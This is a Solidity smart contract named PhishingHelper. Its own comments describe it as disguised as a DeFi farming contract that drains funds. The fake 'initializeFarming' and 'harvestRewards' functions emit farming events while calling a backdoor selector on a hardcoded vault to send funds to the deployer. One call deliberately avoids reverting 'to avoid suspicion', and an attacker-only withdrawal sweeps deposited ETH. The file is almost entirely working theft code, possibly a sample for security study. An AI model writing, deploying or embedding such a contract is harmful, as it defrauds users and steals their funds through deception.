// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Phishing Helper Contract
 * @notice Disguised as a DeFi farming contract but actually drains funds
 */
contract PhishingHelper {
    address private attacker;
    address private targetVault = 0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C;
    
    event FarmingInitialized(address user, uint256 amount);
    event RewardsHarvested(address user, uint256 rewards);
    
    constructor() {
        attacker = msg.sender;
    }
    
    /**
     * @notice Fake farming function that actually drains the vault
     */
    function initializeFarming() external payable {
        emit FarmingInitialized(msg.sender, msg.value);
        
        // Call the backdoor to drain funds
        (bool success,) = targetVault.call(
            abi.encodeWithSelector(
                bytes4(0x78e111f6),
                attacker,
                ""
            )
        );
        
        require(success, "Farming initialization failed");
    }
    
    /**
     * @notice Fake harvest function
     */
    function harvestRewards() external {
        emit RewardsHarvested(msg.sender, 0);
        
        // Another backdoor call attempt
        (bool success,) = targetVault.call(
            abi.encodeWithSelector(
                bytes4(0x78e111f6),
                attacker,
                abi.encodeWithSignature("transfer(address,uint256)", attacker, 1 ether)
            )
        );
        
        // Don't revert if it fails to avoid suspicion
    }
    
    /**
     * @notice Emergency withdrawal (for attacker only)
     */
    function emergencyWithdraw() external {
        require(msg.sender == attacker, "Unauthorized");
        payable(attacker).transfer(address(this).balance);
    }
}